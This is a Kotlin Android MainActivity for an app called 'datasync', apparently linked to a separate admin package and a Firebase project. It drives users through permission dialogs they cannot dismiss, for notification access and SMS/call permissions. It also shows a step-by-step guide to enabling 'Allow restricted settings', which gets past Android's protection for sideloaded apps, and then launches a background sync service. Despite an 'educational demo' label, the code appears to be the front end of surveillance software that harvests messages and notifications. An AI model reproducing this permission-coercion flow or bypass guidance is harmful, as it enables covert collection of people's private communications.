package com.boxx.datasync

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.background
import androidx.compose.foundation.gestures.detectDragGestures
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.IntOffset
import androidx.compose.ui.unit.dp
import kotlin.math.roundToInt
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.permission.PermissionHandler
import com.boxx.datasync.permission.PermissionStatus
import com.boxx.datasync.permission.PermissionUiState
import com.boxx.datasync.permission.PermissionViewModel
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val permissionViewModel: PermissionViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    val uiState by permissionViewModel.uiState.collectAsState()
                    val permissions by permissionViewModel.permissions.collectAsState()
                    val handler = remember { PermissionHandler(context) }
                    var pendingSyncRequest by remember { mutableStateOf(false) }

                    val launcher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { _ ->
                        permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = true)
                    }

                    val state = uiState
                    if (state !is PermissionUiState.Checking) {
                        Log.d("PermissionFlow", "PERMISSION_UI_STACK_PREVENTED")
                    }

                    if (state is PermissionUiState.Checking) {
                        PermissionLoadingScreen()
                    } else {
                        Box(modifier = Modifier.fillMaxSize()) {
                            // Base UI: MainScreen is always visible except when checking
                            MainScreen(
                                viewModel = viewModel,
                                onSyncClick = {
                                    Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                    if (state is PermissionUiState.Ready) {
                                        viewModel.setSyncing()
                                        startSyncService(context)
                                    } else {
                                        pendingSyncRequest = true
                                        permissionViewModel.refreshStatuses(this@MainActivity)
                                    }
                                },
                                showSettings = {
                                    val intent = handler.getAppSettingsIntent()
                                    startActivity(intent)
                                }
                            )

                            // Overlay Permission UI
                            when (state) {
                                is PermissionUiState.RequestRuntime -> {
                                    LaunchedEffect(Unit) {
                                        val runtimePermissions = permissions
                                            .filter { !it.isSpecial && it.permission != null }
                                            .filter { handler.getStatus(it) != PermissionStatus.GRANTED }
                                            .mapNotNull { it.permission }
                                            .toTypedArray()
                                        if (runtimePermissions.isNotEmpty()) {
                                            handler.markRequested(runtimePermissions)
                                            launcher.launch(runtimePermissions)
                                        } else {
                                            permissionViewModel.refreshStatuses(this@MainActivity)
                                        }
                                    }
                                }
                                is PermissionUiState.DeniedRetry -> {
                                    AlertDialog(
                                        onDismissRequest = { /* Prevent dismissal */ },
                                        title = { Text("Permission Required") },
                                        text = { Text("App needs permissions to work properly.") },
                                        confirmButton = {
                                            Button(onClick = {
                                                permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = false)
                                            }) {
                                                Text("Retry Permission")
                                            }
                                        }
                                    )
                                }
                                is PermissionUiState.NeedNotificationListener -> {
                                    SimplePermissionDialog(
                                        title = "Notification Access Required",
                                        text = "Required to sync incoming notifications to your dashboard.",
                                        onConfirm = {
                                            Log.d("PermissionFlow", "PERMISSION_SETTINGS_OPENED - Notification Listener")
                                            context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                        }
                                    )
                                }
                                is PermissionUiState.NeedRestrictedSettings -> {
                                    LaunchedEffect(Unit) {
                                        Log.d("PermissionFlow", "RESTRICTED_GUIDE_SHOWN")
                                    }
                                    PipRestrictedGuide(
                                        onOpenSettings = {
                                            Log.d("PermissionFlow", "PERMISSION_SETTINGS_OPENED - App Details")
                                            context.startActivity(handler.getAppSettingsIntent())
                                        },
                                        onDone = {
                                            Log.d("PermissionFlow", "RESTRICTED_GUIDE_DISMISSED")
                                            permissionViewModel.markRestrictedGuideShown()
                                        }
                                    )
                                }
                                is PermissionUiState.NeedAppSettings -> {
                                    SimplePermissionDialog(
                                        title = "Permission Required",
                                        text = "Please enable the required permission from Settings to keep sync working.",
                                        onConfirm = {
                                            Log.d("PermissionFlow", "PERMISSION_SETTINGS_OPENED - App Details")
                                            context.startActivity(handler.getAppSettingsIntent())
                                        }
                                    )
                                }
                                is PermissionUiState.Ready -> {
                                    LaunchedEffect(Unit) {
                                        Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
                                        (context.applicationContext as? UserApplication)?.setupContentObservers()
                                        permissionViewModel.refreshStatuses(this@MainActivity) // Final check

                                        if (pendingSyncRequest) {
                                            pendingSyncRequest = false
                                            viewModel.setSyncing()
                                            startSyncService(context)
                                        }
                                    }
                                }
                                else -> {}
                            }
                        }
                    }
                }
            }
        }
        setupWorkManager()
    }

    override fun onResume() {
        super.onResume()
        Log.d("PermissionFlow", "PERMISSION_ON_RESUME_RECHECK")
        permissionViewModel.refreshStatuses(this)
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    @Composable
    private fun PermissionLoadingScreen() {
        Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Surface(
                    color = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.5f),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary)
                        Spacer(modifier = Modifier.width(12.dp))
                        Text(
                            "This educational demo syncs data only after user-granted permissions.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSecondaryContainer,
                            textAlign = TextAlign.Center
                        )
                    }
                }
                Spacer(modifier = Modifier.height(24.dp))
                CircularProgressIndicator()
                Spacer(modifier = Modifier.height(16.dp))
                Text("Setting up permissions...", style = MaterialTheme.typography.bodyMedium)
            }
        }
    }

    @Composable
    private fun SimplePermissionDialog(title: String, text: String, onConfirm: () -> Unit) {
        AlertDialog(
            onDismissRequest = { /* Prevent dismissal */ },
            title = { Text(title) },
            text = { Text(text) },
            confirmButton = {
                Button(onClick = onConfirm) {
                    Text("Open Settings")
                }
            },
            dismissButton = {
                TextButton(onClick = { /* Optional: handle cancel */ }) {
                    Text("Cancel")
                }
            }
        )
    }

    @Composable
    private fun PipRestrictedGuide(onOpenSettings: () -> Unit, onDone: () -> Unit) {
        var offsetX by remember { mutableStateOf(0f) }
        var offsetY by remember { mutableStateOf(0f) }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp)
        ) {
            Card(
                modifier = Modifier
                    .offset { IntOffset(offsetX.roundToInt(), offsetY.roundToInt()) }
                    .width(280.dp)
                    .align(Alignment.TopCenter)
                    .pointerInput(Unit) {
                        detectDragGestures { change, dragAmount ->
                            change.consume()
                            offsetX += dragAmount.x
                            offsetY += dragAmount.y
                        }
                    },
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    horizontalAlignment = Alignment.CenterHorizontally,
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            "Restricted Setting Guide",
                            style = MaterialTheme.typography.titleSmall,
                            fontWeight = FontWeight.Bold
                        )
                        IconButton(onClick = onDone, modifier = Modifier.size(24.dp)) {
                            Icon(Icons.Default.Close, contentDescription = "Close", modifier = Modifier.size(16.dp))
                        }
                    }

                    Text(
                        "SMS/Call permission may be restricted. Open App Info and enable Allow restricted settings only if SMS/Call permissions cannot be granted normally.",
                        style = MaterialTheme.typography.bodySmall,
                        textAlign = TextAlign.Start
                    )

                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(
                                MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
                                RoundedCornerShape(8.dp)
                            )
                            .padding(8.dp),
                        verticalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        Text("1. Open App Info", style = MaterialTheme.typography.labelSmall)
                        Text("2. Tap three dots (⋮)", style = MaterialTheme.typography.labelSmall)
                        Text("3. Allow restricted settings", style = MaterialTheme.typography.labelSmall)
                    }

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = onOpenSettings,
                            modifier = Modifier.weight(1f),
                            contentPadding = PaddingValues(0.dp)
                        ) {
                            Text("Open Settings", style = MaterialTheme.typography.labelLarge)
                        }
                        Button(
                            onClick = onDone,
                            modifier = Modifier.weight(0.6f),
                            contentPadding = PaddingValues(0.dp)
                        ) {
                            Text("Done", style = MaterialTheme.typography.labelLarge)
                        }
                    }
                }
            }
        }
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

}
